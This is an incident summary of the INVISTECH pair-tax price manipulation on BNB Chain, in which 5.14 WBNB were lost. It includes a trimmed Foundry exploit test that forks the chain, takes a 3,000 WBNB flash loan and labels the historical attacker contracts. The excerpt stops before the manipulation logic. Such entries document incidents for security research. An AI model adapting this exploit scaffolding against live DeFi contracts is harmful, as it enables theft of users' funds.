# [?] INVISTECH - Pair Tax Price Manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: INVISTECH
Published: 2025-02-24
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/INVISTECH_exp.sol
Type: defi-exploit-poc

## Details
Lost: 5.14 WBNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IPancakeV3Pool private constant flashPool = IPancakeV3Pool(PANCAKE_V3_POOL);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IERC20 private constant invistech = IERC20(INVISTECH_TOKEN);
    IWBNB private constant wbnb = IWBNB(payable(WBNB_TOKEN));

    uint256 private constant FLASH_AMOUNT = 3_000 ether;

    function setUp() public {
        uint256 forkBlock = 46_946_670;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = WBNB_TOKEN;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HISTORICAL_HELPER, "Historical helper");
        vm.label(INVISTECH_TOKEN, "INVISTECH");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(PANCAKE_V3_POOL, "Pancake V3 USDT/WBNB Pool");

        RebuiltInvistechHelper helper = new RebuiltInvistechHelper();
        vm.etch(HISTORICAL_HELPER, address(helper).code);
    }

    function testExploit() public balanceLog {
        uint256 balanceBefore = wbnb.balanceOf(address(this));
        flashPool.flash(address(this), 0, FLASH_AMOUNT, "");
        assertGt(wbnb.balanceOf(address(this)) - balanceBefore, 5 ether);
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == PANCAKE_V3_POOL, "pool only");

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/INVISTECH_exp.sol_
